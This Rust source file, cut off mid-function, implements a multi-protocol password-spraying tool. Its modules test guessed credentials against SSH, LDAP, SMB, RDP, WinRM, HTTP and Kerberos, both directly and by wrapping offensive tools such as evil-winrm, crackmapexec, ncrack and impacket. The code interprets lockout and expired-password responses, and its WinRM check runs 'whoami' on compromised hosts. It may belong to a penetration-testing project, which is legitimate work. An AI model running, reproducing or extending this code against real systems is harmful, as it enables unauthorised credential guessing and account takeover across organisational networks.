// Protocol-specific authentication implementations
// Each protocol module implements try_auth() for password spraying

pub mod ssh {
    use log::{debug, warn, info};
    use std::net::TcpStream;
    use ssh2::Session;
    use std::time::Duration;

    pub async fn try_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
    ) -> (bool, Option<String>) {
        let addr = format!("{}:{}", host, port);
        let username = username.to_string();
        let password = password.to_string();
        let addr_clone = addr.clone();

        // Run SSH connection in blocking thread since ssh2 is synchronous
        let result = tokio::task::spawn_blocking(move || {
            // Connect with timeout
            let tcp = match TcpStream::connect_timeout(
                &addr_clone.parse().unwrap_or_else(|_| {
                    format!("{}:{}", "0.0.0.0", port).parse().unwrap()
                }),
                Duration::from_secs(10),
            ) {
                Ok(stream) => stream,
                Err(e) => {
                    warn!("SSH connection to {} failed: {}", addr_clone, e);
                    return (false, Some(format!("Connection failed: {}", e)));
                }
            };

            // Set read/write timeouts
            let _ = tcp.set_read_timeout(Some(Duration::from_secs(15)));
            let _ = tcp.set_write_timeout(Some(Duration::from_secs(15)));

            // Create SSH session
            let mut session = match Session::new() {
                Ok(s) => s,
                Err(e) => {
                    return (false, Some(format!("Failed to create SSH session: {}", e)));
                }
            };

            session.set_tcp_stream(tcp);

            // Perform SSH handshake
            if let Err(e) = session.handshake() {
                debug!("SSH handshake failed for {}: {}", addr_clone, e);
                return (false, Some(format!("SSH handshake failed: {}", e)));
            }

            // Try password authentication
            match session.userauth_password(&username, &password) {
                Ok(_) => {
                    if session.authenticated() {
                        info!("SSH authentication successful: {}@{}", username, addr_clone);
                        (true, None)
                    } else {
                        debug!("SSH auth returned OK but not authenticated for {}@{}", username, addr_clone);
                        (false, Some("Authentication status unclear".to_string()))
                    }
                }
                Err(e) => {
                    // Check for common auth failure patterns
                    let error_msg = e.to_string();
                    if error_msg.contains("USERAUTH_DENIED") ||
                       error_msg.contains("authentication failed") ||
                       error_msg.contains("Permission denied") {
                        debug!("SSH auth failed for {}@{}: {}", username, addr_clone, e);
                        (false, Some("Invalid credentials".to_string()))
                    } else {
                        warn!("SSH auth error for {}@{}: {}", username, addr_clone, e);
                        (false, Some(format!("Auth error: {}", e)))
                    }
                }
            }
        }).await;

        match result {
            Ok(r) => r,
            Err(e) => {
                warn!("SSH task panicked for {}: {}", addr, e);
                (false, Some(format!("Task error: {}", e)))
            }
        }
    }
}

pub mod ldap {
    use log::{debug, warn, info};
    use ldap3::{LdapConnAsync, LdapConnSettings};
    use std::time::Duration;

    pub async fn try_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        // Build LDAP URL
        let scheme = if use_ssl { "ldaps" } else { "ldap" };
        let url = format!("{}://{}:{}", scheme, host, port);

        // Configure connection settings with timeout
        let settings = LdapConnSettings::new()
            .set_conn_timeout(Duration::from_secs(10));

        // Connect to LDAP server
        let (conn, mut ldap) = match LdapConnAsync::with_settings(settings, &url).await {
            Ok(result) => result,
            Err(e) => {
                warn!("LDAP connection to {} failed: {}", url, e);
                return (false, Some(format!("Connection failed: {}", e)));
            }
        };

        // Drive the connection in background
        ldap3::drive!(conn);

        // Attempt simple bind (authentication)
        // Username format can be:
        // - DN format: cn=username,dc=domain,dc=com
        // - UPN format: username@domain.com
        // - SAM format: DOMAIN\username
        let bind_result = ldap.simple_bind(username, password).await;

        match bind_result {
            Ok(result) => {
                // Check bind result
                match result.success() {
                    Ok(_) => {
                        info!("LDAP authentication successful: {} @ {}", username, url);
                        // Unbind cleanly
                        let _ = ldap.unbind().await;
                        (true, None)
                    }
                    Err(e) => {
                        // LDAP error codes for auth failure:
                        // 49 = Invalid credentials
                        // 52e = LDAP_INVALID_CREDENTIALS
                        // 775 = Account locked out
                        let error_str = format!("{:?}", e);
                        if error_str.contains("49") || error_str.contains("INVALID_CREDENTIALS") {
                            debug!("LDAP auth failed for {} @ {}: invalid credentials", username, url);
                            (false, Some("Invalid credentials".to_string()))
                        } else if error_str.contains("775") || error_str.contains("ACCOUNT_LOCKED") {
                            warn!("LDAP account locked: {} @ {}", username, url);
                            (false, Some("Account locked".to_string()))
                        } else {
                            debug!("LDAP bind error for {} @ {}: {:?}", username, url, e);
                            (false, Some(format!("Bind failed: {:?}", e)))
                        }
                    }
                }
            }
            Err(e) => {
                warn!("LDAP bind failed for {} @ {}: {}", username, url, e);
                (false, Some(format!("Bind error: {}", e)))
            }
        }
    }
}

pub mod smb {
    use log::{debug, warn, info};
    use tokio::process::Command;
    use std::time::Duration;

    /// Try SMB authentication using smbclient
    /// Falls back to connection test if smbclient is not available
    pub async fn try_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
    ) -> (bool, Option<String>) {
        try_auth_with_domain(host, port, username, password, None).await
    }

    /// Try SMB authentication with optional domain
    pub async fn try_auth_with_domain(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        // Check if smbclient is available
        let smbclient_check = Command::new("which")
            .arg("smbclient")
            .output()
            .await;

        if smbclient_check.is_ok() && smbclient_check.as_ref().unwrap().status.success() {
            // Use smbclient for authentication test
            return try_smbclient_auth(host, port, username, password, domain).await;
        }

        // Fallback: check if rpcclient is available
        let rpcclient_check = Command::new("which")
            .arg("rpcclient")
            .output()
            .await;

        if rpcclient_check.is_ok() && rpcclient_check.as_ref().unwrap().status.success() {
            return try_rpcclient_auth(host, username, password, domain).await;
        }

        // No SMB tools available - attempt raw connection test
        warn!("No SMB tools (smbclient/rpcclient) available, using connection test only");
        try_connection_test(host, port).await
    }

    async fn try_smbclient_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        // Build smbclient command to list shares (lightweight auth test)
        // smbclient -L \\\\host -U 'username%password' -p port
        let user_arg = if let Some(dom) = domain {
            format!("{}\\{}%{}", dom, username, password)
        } else {
            format!("{}%{}", username, password)
        };

        let result = tokio::time::timeout(
            Duration::from_secs(15),
            Command::new("smbclient")
                .args([
                    "-L",
                    &format!("//{}", host),
                    "-U",
                    &user_arg,
                    "-p",
                    &port.to_string(),
                    "-g", // Guest fallback disabled
                    "-N", // No password prompt
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}{}", stdout, stderr);

                // Check for successful authentication indicators
                if output.status.success() || combined.contains("Sharename") {
                    info!("SMB authentication successful: {}@{}", username, host);
                    (true, None)
                } else if combined.contains("NT_STATUS_LOGON_FAILURE") ||
                          combined.contains("LOGON_FAILURE") ||
                          combined.contains("NT_STATUS_WRONG_PASSWORD") {
                    debug!("SMB auth failed for {}@{}: invalid credentials", username, host);
                    (false, Some("Invalid credentials".to_string()))
                } else if combined.contains("NT_STATUS_ACCOUNT_LOCKED_OUT") {
                    warn!("SMB account locked: {}@{}", username, host);
                    (false, Some("Account locked".to_string()))
                } else if combined.contains("NT_STATUS_ACCOUNT_DISABLED") {
                    debug!("SMB account disabled: {}@{}", username, host);
                    (false, Some("Account disabled".to_string()))
                } else if combined.contains("NT_STATUS_PASSWORD_EXPIRED") {
                    info!("SMB password expired (auth may have succeeded): {}@{}", username, host);
                    (true, Some("Password expired".to_string()))
                } else if combined.contains("NT_STATUS_PASSWORD_MUST_CHANGE") {
                    info!("SMB password must change (auth succeeded): {}@{}", username, host);
                    (true, Some("Password must be changed".to_string()))
                } else if combined.contains("NT_STATUS_HOST_UNREACHABLE") ||
                          combined.contains("NT_STATUS_CONNECTION_REFUSED") {
                    warn!("SMB connection failed to {}", host);
                    (false, Some("Connection refused".to_string()))
                } else {
                    debug!("SMB unknown result for {}@{}: {}", username, host, combined);
                    (false, Some(format!("Unknown result: {}", combined.chars().take(100).collect::<String>())))
                }
            }
            Ok(Err(e)) => {
                warn!("Failed to execute smbclient for {}: {}", host, e);
                (false, Some(format!("Execution error: {}", e)))
            }
            Err(_) => {
                warn!("SMB authentication timeout for {}@{}", username, host);
                (false, Some("Connection timeout".to_string()))
            }
        }
    }

    async fn try_rpcclient_auth(
        host: &str,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        let user_arg = if let Some(dom) = domain {
            format!("{}\\{}", dom, username)
        } else {
            username.to_string()
        };

        let result = tokio::time::timeout(
            Duration::from_secs(15),
            Command::new("rpcclient")
                .args([
                    "-U",
                    &format!("{}%{}", user_arg, password),
                    host,
                    "-c",
                    "getusername",
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}{}", stdout, stderr);

                if output.status.success() || combined.contains("Account Name") {
                    info!("SMB (rpcclient) auth successful: {}@{}", username, host);
                    (true, None)
                } else if combined.contains("NT_STATUS_LOGON_FAILURE") {
                    (false, Some("Invalid credentials".to_string()))
                } else {
                    (false, Some(format!("Auth failed: {}", combined.chars().take(100).collect::<String>())))
                }
            }
            Ok(Err(e)) => {
                (false, Some(format!("Execution error: {}", e)))
            }
            Err(_) => {
                (false, Some("Connection timeout".to_string()))
            }
        }
    }

    async fn try_connection_test(
        host: &str,
        port: u16,
    ) -> (bool, Option<String>) {
        use tokio::net::TcpStream;
        use tokio::time::timeout;

        let addr = format!("{}:{}", host, port);

        match timeout(Duration::from_secs(10), TcpStream::connect(&addr)).await {
            Ok(Ok(_)) => {
                debug!("SMB port {} open on {}, but no auth tools available", port, host);
                (false, Some("SMB port open - install smbclient for auth testing".to_string()))
            }
            Ok(Err(e)) => {
                warn!("SMB connection to {} failed: {}", addr, e);
                (false, Some(format!("Connection failed: {}", e)))
            }
            Err(_) => {
                (false, Some("Connection timeout".to_string()))
            }
        }
    }
}

pub mod rdp {
    use log::{debug, warn, info};
    use tokio::process::Command;
    use std::time::Duration;

    /// Try RDP authentication using xfreerdp or rdesktop
    #[allow(dead_code)]
    pub async fn try_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
    ) -> (bool, Option<String>) {
        try_auth_with_domain(host, port, username, password, None).await
    }

    /// Try RDP authentication with optional domain
    #[allow(dead_code)]
    pub async fn try_auth_with_domain(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        // Check for xfreerdp first (more reliable)
        let xfreerdp_check = Command::new("which")
            .arg("xfreerdp")
            .output()
            .await;

        if xfreerdp_check.is_ok() && xfreerdp_check.as_ref().unwrap().status.success() {
            return try_xfreerdp_auth(host, port, username, password, domain).await;
        }

        // Try xfreerdp3 (newer version)
        let xfreerdp3_check = Command::new("which")
            .arg("xfreerdp3")
            .output()
            .await;

        if xfreerdp3_check.is_ok() && xfreerdp3_check.as_ref().unwrap().status.success() {
            return try_xfreerdp3_auth(host, port, username, password, domain).await;
        }

        // Fallback to ncrack if available
        let ncrack_check = Command::new("which")
            .arg("ncrack")
            .output()
            .await;

        if ncrack_check.is_ok() && ncrack_check.as_ref().unwrap().status.success() {
            return try_ncrack_rdp(host, port, username, password).await;
        }

        warn!("No RDP tools (xfreerdp/ncrack) available");
        (false, Some("Install xfreerdp or ncrack for RDP testing".to_string()))
    }

    #[allow(dead_code)]
    async fn try_xfreerdp_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        // xfreerdp /v:host:port /u:user /p:pass /cert:ignore /auth-only
        let mut args = vec![
            format!("/v:{}:{}", host, port),
            format!("/u:{}", username),
            format!("/p:{}", password),
            "/cert:ignore".to_string(),
            "/auth-only".to_string(),
            "+auth-only".to_string(),
            "/sec:any".to_string(),
        ];

        if let Some(dom) = domain {
            args.push(format!("/d:{}", dom));
        }

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("xfreerdp")
                .args(&args)
                .output()
        ).await;

        parse_rdp_result(result, username, host).await
    }

    #[allow(dead_code)]
    async fn try_xfreerdp3_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        let mut args = vec![
            format!("/v:{}:{}", host, port),
            format!("/u:{}", username),
            format!("/p:{}", password),
            "/cert:ignore".to_string(),
            "/auth-only".to_string(),
        ];

        if let Some(dom) = domain {
            args.push(format!("/d:{}", dom));
        }

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("xfreerdp3")
                .args(&args)
                .output()
        ).await;

        parse_rdp_result(result, username, host).await
    }

    #[allow(dead_code)]
    async fn parse_rdp_result(
        result: Result<Result<std::process::Output, std::io::Error>, tokio::time::error::Elapsed>,
        username: &str,
        host: &str,
    ) -> (bool, Option<String>) {
        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}{}", stdout, stderr).to_lowercase();

                // xfreerdp returns 0 on successful auth-only
                if output.status.success() {
                    info!("RDP authentication successful: {}@{}", username, host);
                    (true, None)
                } else if combined.contains("authentication failure") ||
                          combined.contains("logon_failed") ||
                          combined.contains("invalid credentials") ||
                          combined.contains("error_password") {
                    debug!("RDP auth failed for {}@{}: invalid credentials", username, host);
                    (false, Some("Invalid credentials".to_string()))
                } else if combined.contains("account locked") ||
                          combined.contains("account_locked") {
                    warn!("RDP account locked: {}@{}", username, host);
                    (false, Some("Account locked".to_string()))
                } else if combined.contains("account disabled") ||
                          combined.contains("account_disabled") {
                    (false, Some("Account disabled".to_string()))
                } else if combined.contains("password expired") ||
                          combined.contains("password_expired") ||
                          combined.contains("password must be changed") {
                    info!("RDP password expired (auth may have succeeded): {}@{}", username, host);
                    (true, Some("Password expired".to_string()))
                } else if combined.contains("unreachable") ||
                          combined.contains("connection refused") ||
                          combined.contains("timeout") {
                    (false, Some("Connection failed".to_string()))
                } else if combined.contains("authentication only") && combined.contains("success") {
                    info!("RDP authentication successful: {}@{}", username, host);
                    (true, None)
                } else {
                    // Check exit code - some versions use specific codes
                    let code = output.status.code().unwrap_or(-1);
                    if code == 0 || code == 131 {
                        // 131 can indicate successful auth in some xfreerdp versions
                        (true, None)
                    } else {
                        debug!("RDP unknown result for {}@{}: exit={}, output={}",
                               username, host, code, combined.chars().take(200).collect::<String>());
                        (false, Some(format!("Auth failed (exit code: {})", code)))
                    }
                }
            }
            Ok(Err(e)) => {
                warn!("Failed to execute xfreerdp for {}: {}", host, e);
                (false, Some(format!("Execution error: {}", e)))
            }
            Err(_) => {
                warn!("RDP authentication timeout for {}@{}", username, host);
                (false, Some("Connection timeout".to_string()))
            }
        }
    }

    #[allow(dead_code)]
    async fn try_ncrack_rdp(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
    ) -> (bool, Option<String>) {
        // ncrack -p port --user username --pass password rdp://host
        let result = tokio::time::timeout(
            Duration::from_secs(60),
            Command::new("ncrack")
                .args([
                    "-p",
                    &port.to_string(),
                    "--user",
                    username,
                    "--pass",
                    password,
                    &format!("rdp://{}", host),
                    "-v",
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                if stdout.contains("Discovered credentials") {
                    info!("RDP authentication successful (ncrack): {}@{}", username, host);
                    (true, None)
                } else {
                    debug!("RDP auth failed (ncrack) for {}@{}", username, host);
                    (false, Some("Invalid credentials".to_string()))
                }
            }
            Ok(Err(e)) => (false, Some(format!("Execution error: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }
}

pub mod winrm {
    use log::{debug, warn, info};
    use tokio::process::Command;
    use std::time::Duration;

    /// Try WinRM authentication
    /// Uses evil-winrm, crackmapexec/netexec, or curl with NTLM
    #[allow(dead_code)]
    pub async fn try_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        try_auth_with_domain(host, port, username, password, None, use_ssl).await
    }

    /// Try WinRM authentication with optional domain
    #[allow(dead_code)]
    pub async fn try_auth_with_domain(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        // Check for evil-winrm first (most capable)
        let evil_winrm_check = Command::new("which")
            .arg("evil-winrm")
            .output()
            .await;

        if evil_winrm_check.is_ok() && evil_winrm_check.as_ref().unwrap().status.success() {
            return try_evil_winrm_auth(host, port, username, password, use_ssl).await;
        }

        // Try crackmapexec with winrm
        let cme_check = Command::new("which")
            .arg("crackmapexec")
            .output()
            .await;

        if cme_check.is_ok() && cme_check.as_ref().unwrap().status.success() {
            return try_cme_winrm(host, port, username, password, domain).await;
        }

        // Try netexec (newer fork of crackmapexec)
        let nxc_check = Command::new("which")
            .arg("netexec")
            .output()
            .await;

        if nxc_check.is_ok() && nxc_check.as_ref().unwrap().status.success() {
            return try_netexec_winrm(host, port, username, password, domain).await;
        }

        // Fallback: try curl with NTLM auth
        try_curl_winrm(host, port, username, password, domain, use_ssl).await
    }

    #[allow(dead_code)]
    async fn try_evil_winrm_auth(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        let mut args = vec![
            "-i".to_string(),
            host.to_string(),
            "-u".to_string(),
            username.to_string(),
            "-p".to_string(),
            password.to_string(),
            "-P".to_string(),
            port.to_string(),
        ];

        if use_ssl {
            args.push("-S".to_string());
        }

        args.push("-c".to_string());
        args.push("whoami".to_string());

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("evil-winrm")
                .args(&args)
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}{}", stdout, stderr).to_lowercase();

                if stdout.contains("\\") || stdout.contains(username.to_lowercase().as_str()) {
                    info!("WinRM authentication successful (evil-winrm): {}@{}", username, host);
                    (true, None)
                } else if combined.contains("logon_failure") ||
                          combined.contains("access_denied") ||
                          combined.contains("invalid credentials") {
                    debug!("WinRM auth failed for {}@{}", username, host);
                    (false, Some("Invalid credentials".to_string()))
                } else if combined.contains("account locked") {
                    (false, Some("Account locked".to_string()))
                } else if combined.contains("connection refused") || combined.contains("timeout") {
                    (false, Some("Connection failed".to_string()))
                } else {
                    (false, Some("Authentication failed".to_string()))
                }
            }
            Ok(Err(e)) => {
                warn!("Failed to execute evil-winrm: {}", e);
                (false, Some(format!("Execution error: {}", e)))
            }
            Err(_) => {
                (false, Some("Connection timeout".to_string()))
            }
        }
    }

    #[allow(dead_code)]
    async fn try_cme_winrm(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        let mut args = vec![
            "winrm".to_string(),
            host.to_string(),
            "-u".to_string(),
            username.to_string(),
            "-p".to_string(),
            password.to_string(),
            "--port".to_string(),
            port.to_string(),
        ];

        if let Some(dom) = domain {
            args.push("-d".to_string());
            args.push(dom.to_string());
        }

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("crackmapexec")
                .args(&args)
                .output()
        ).await;

        parse_cme_output(result, username, host, "crackmapexec").await
    }

    #[allow(dead_code)]
    async fn try_netexec_winrm(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
    ) -> (bool, Option<String>) {
        let mut args = vec![
            "winrm".to_string(),
            host.to_string(),
            "-u".to_string(),
            username.to_string(),
            "-p".to_string(),
            password.to_string(),
            "--port".to_string(),
            port.to_string(),
        ];

        if let Some(dom) = domain {
            args.push("-d".to_string());
            args.push(dom.to_string());
        }

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("netexec")
                .args(&args)
                .output()
        ).await;

        parse_cme_output(result, username, host, "netexec").await
    }

    #[allow(dead_code)]
    async fn parse_cme_output(
        result: Result<Result<std::process::Output, std::io::Error>, tokio::time::error::Elapsed>,
        username: &str,
        host: &str,
        tool: &str,
    ) -> (bool, Option<String>) {
        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}{}", stdout, stderr);

                if combined.contains("[+]") || combined.contains("Pwn3d!") {
                    info!("WinRM auth successful ({}): {}@{}", tool, username, host);
                    (true, None)
                } else if combined.contains("[-]") {
                    debug!("WinRM auth failed ({}): {}@{}", tool, username, host);
                    (false, Some("Invalid credentials".to_string()))
                } else if combined.contains("STATUS_ACCOUNT_LOCKED_OUT") {
                    (false, Some("Account locked".to_string()))
                } else {
                    (false, Some("Authentication failed".to_string()))
                }
            }
            Ok(Err(e)) => (false, Some(format!("Execution error: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }

    #[allow(dead_code)]
    async fn try_curl_winrm(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        domain: Option<&str>,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        let scheme = if use_ssl { "https" } else { "http" };
        let url = format!("{}://{}:{}/wsman", scheme, host, port);

        let user = if let Some(dom) = domain {
            format!("{}\\{}", dom, username)
        } else {
            username.to_string()
        };

        let result = tokio::time::timeout(
            Duration::from_secs(15),
            Command::new("curl")
                .args([
                    "-s",
                    "-k",
                    "--ntlm",
                    "-u",
                    &format!("{}:{}", user, password),
                    "-X",
                    "POST",
                    "-H",
                    "Content-Type: application/soap+xml;charset=UTF-8",
                    "-d",
                    r#"<?xml version="1.0" encoding="UTF-8"?><s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd"><s:Header/><s:Body><wsmid:Identify/></s:Body></s:Envelope>"#,
                    &url,
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                if stdout.contains("IdentifyResponse") || stdout.contains("ProductVendor") {
                    info!("WinRM authentication successful (curl): {}@{}", username, host);
                    (true, None)
                } else if stdout.contains("401") || stderr.contains("401") {
                    debug!("WinRM auth failed for {}@{}: 401 Unauthorized", username, host);
                    (false, Some("Invalid credentials".to_string()))
                } else if stderr.contains("Connection refused") {
                    (false, Some("Connection refused".to_string()))
                } else if stdout.contains("<?xml") || stdout.contains("<s:Envelope") {
                    (true, None)
                } else {
                    (false, Some("Unknown response".to_string()))
                }
            }
            Ok(Err(e)) => (false, Some(format!("Execution error: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }
}

pub mod http {
    use log::{debug, warn};
    use reqwest::Client;
    use tokio::time::Duration;

    #[allow(dead_code)]
    pub async fn try_basic_auth(
        host: &str,
        port: u16,
        path: &str,
        username: &str,
        password: &str,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        let scheme = if use_ssl { "https" } else { "http" };
        let url = format!("{}://{}:{}{}", scheme, host, port, path);

        let client = Client::builder()
            .timeout(Duration::from_secs(10))
            .danger_accept_invalid_certs(true)
            .build();

        match client {
            Ok(client) => {
                let result = client
                    .get(&url)
                    .basic_auth(username, Some(password))
                    .send()
                    .await;

                match result {
                    Ok(response) => {
                        let status = response.status();
                        if status.is_success() || status == reqwest::StatusCode::FORBIDDEN {
                            // 200 OK or 403 Forbidden (authenticated but not authorized)
                            debug!("HTTP Basic auth successful for {} at {}", username, url);
                            (true, None)
                        } else if status == reqwest::StatusCode::UNAUTHORIZED {
                            debug!("HTTP Basic auth failed for {} at {}", username, url);
                            (false, Some("Invalid credentials".to_string()))
                        } else {
                            (false, Some(format!("Unexpected status: {}", status)))
                        }
                    }
                    Err(e) => {
                        warn!("HTTP request failed: {}", e);
                        (false, Some(format!("Request failed: {}", e)))
                    }
                }
            }
            Err(e) => {
                (false, Some(format!("Failed to create HTTP client: {}", e)))
            }
        }
    }

    #[allow(dead_code)]
    pub async fn try_ntlm_auth(
        host: &str,
        port: u16,
        path: &str,
        username: &str,
        password: &str,
        domain: Option<&str>,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        use tokio::process::Command;
        use log::info;

        let scheme = if use_ssl { "https" } else { "http" };
        let url = format!("{}://{}:{}{}", scheme, host, port, path);

        // Build user string with domain
        let user = if let Some(dom) = domain {
            format!("{}\\{}", dom, username)
        } else {
            username.to_string()
        };

        // Use curl with --ntlm flag for NTLM authentication
        let result = tokio::time::timeout(
            Duration::from_secs(15),
            Command::new("curl")
                .args([
                    "-s",
                    "-o", "/dev/null",
                    "-w", "%{http_code}",
                    "-k", // Ignore SSL errors
                    "--ntlm",
                    "-u",
                    &format!("{}:{}", user, password),
                    &url,
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let status_code = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);

                match status_code.trim() {
                    "200" | "201" | "204" | "301" | "302" | "403" => {
                        // Success - authenticated (403 means authed but no access)
                        info!("HTTP NTLM auth successful for {} at {}", username, url);
                        (true, None)
                    }
                    "401" => {
                        debug!("HTTP NTLM auth failed for {} at {}", username, url);
                        (false, Some("Invalid credentials".to_string()))
                    }
                    "000" => {
                        // Connection failed
                        if stderr.contains("Connection refused") {
                            (false, Some("Connection refused".to_string()))
                        } else {
                            (false, Some("Connection failed".to_string()))
                        }
                    }
                    code => {
                        (false, Some(format!("HTTP {}", code)))
                    }
                }
            }
            Ok(Err(e)) => {
                warn!("Failed to execute curl: {}", e);
                (false, Some(format!("Execution error: {}", e)))
            }
            Err(_) => {
                (false, Some("Connection timeout".to_string()))
            }
        }
    }

    /// Try HTTP digest authentication
    #[allow(dead_code)]
    pub async fn try_digest_auth(
        host: &str,
        port: u16,
        path: &str,
        username: &str,
        password: &str,
        use_ssl: bool,
    ) -> (bool, Option<String>) {
        use tokio::process::Command;
        use log::info;

        let scheme = if use_ssl { "https" } else { "http" };
        let url = format!("{}://{}:{}{}", scheme, host, port, path);

        let result = tokio::time::timeout(
            Duration::from_secs(15),
            Command::new("curl")
                .args([
                    "-s",
                    "-o", "/dev/null",
                    "-w", "%{http_code}",
                    "-k",
                    "--digest",
                    "-u",
                    &format!("{}:{}", username, password),
                    &url,
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let status_code = String::from_utf8_lossy(&output.stdout);

                match status_code.trim() {
                    "200" | "201" | "204" | "301" | "302" | "403" => {
                        info!("HTTP Digest auth successful for {} at {}", username, url);
                        (true, None)
                    }
                    "401" => {
                        debug!("HTTP Digest auth failed for {} at {}", username, url);
                        (false, Some("Invalid credentials".to_string()))
                    }
                    code => {
                        (false, Some(format!("HTTP {}", code)))
                    }
                }
            }
            Ok(Err(e)) => (false, Some(format!("Execution error: {}", e))),
            Err(_) => (false, Some("Connection timeout".to_string())),
        }
    }
}

pub mod kerberos {
    use log::{debug, warn, info};
    use tokio::process::Command;
    use std::time::Duration;

    /// Try Kerberos authentication using kinit or impacket
    #[allow(dead_code)]
    pub async fn try_auth(
        kdc: &str,
        realm: &str,
        username: &str,
        password: &str,
    ) -> (bool, Option<String>) {
        // Check for impacket's getTGT.py first (more reliable for testing)
        let impacket_check = Command::new("which")
            .arg("getTGT.py")
            .output()
            .await;

        if impacket_check.is_ok() && impacket_check.as_ref().unwrap().status.success() {
            return try_impacket_tgt(kdc, realm, username, password).await;
        }

        // Check for kinit
        let kinit_check = Command::new("which")
            .arg("kinit")
            .output()
            .await;

        if kinit_check.is_ok() && kinit_check.as_ref().unwrap().status.success() {
            return try_kinit_auth(kdc, realm, username, password).await;
        }

        // Check for netexec/crackmapexec with kerberos
        let nxc_check = Command::new("which")
            .arg("netexec")
            .output()
            .await;

        if nxc_check.is_ok() && nxc_check.as_ref().unwrap().status.success() {
            return try_netexec_kerberos(kdc, realm, username, password).await;
        }

        warn!("No Kerberos tools available (kinit, impacket, netexec)");
        (false, Some("Install kinit or impacket for Kerberos testing".to_string()))
    }

    #[allow(dead_code)]
    async fn try_impacket_tgt(
        kdc: &str,
        realm: &str,
        username: &str,
        password: &str,
    ) -> (bool, Option<String>) {
        // getTGT.py domain/user:password -dc-ip kdc
        let user_spec = format!("{}/{}:{}", realm, username, password);

        let result = tokio::time::timeout(
            Duration::from_secs(30),
            Command::new("getTGT.py")
                .args([
                    &user_spec,
                    "-dc-ip",
                    kdc,
                    "-no-save", // Don't save the ticket, just test auth
                ])
                .output()
        ).await;

        match result {
            Ok(Ok(output)) => {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = format!("{}{}", stdout, stderr).to_lowercase();

                if combined.contains("saved to") || combined.contains("krb5ccname") ||
                   output.status.success() {
                    info!("Kerberos auth successful: {}@{}", username, realm);
                    (true, None)
                } else if combined.contains("kdc_err_preauth_failed") ||
                          combined.contains("wrong password") ||
                          combined.contains("kdc_err_c_principal_unknown") {
                    debug!("Kerberos auth failed for {}@{}: invalid credentials", username, realm);
                    (false, Some("Invalid credentials".to_string()))
                } else if combined.contains("kdc_err_client_revoked") {
                    (false, Some("Account disabled or revoked".to_string()))
                } else if combined.contains("clock skew") {
                    (false, Some("Clock skew too great".to_string()))
                } else if combined.contains("connection") || combined.contains("unreachable") {
                    (false, Some("KDC unreachable".to_string()))
                } else {
                    debug!("Kerberos unknown result: {}", combined);
                    (false, Some("Authentication failed".to_string()))
                }
            }
            Ok(Err(e)) => {
                warn!("Failed to execute getTGT.py: {}", e);
                (false, Some(format!("Execution error: {}", e)))
            }
            Err(_) => {
                (false, Some("Connection timeout".to_string()))
            }
        }
    }

    #[allow(dead_code)]
    async fn try_kinit_auth(
        kdc: &str,
        realm: &str,
        username: &str,
        password: &str,
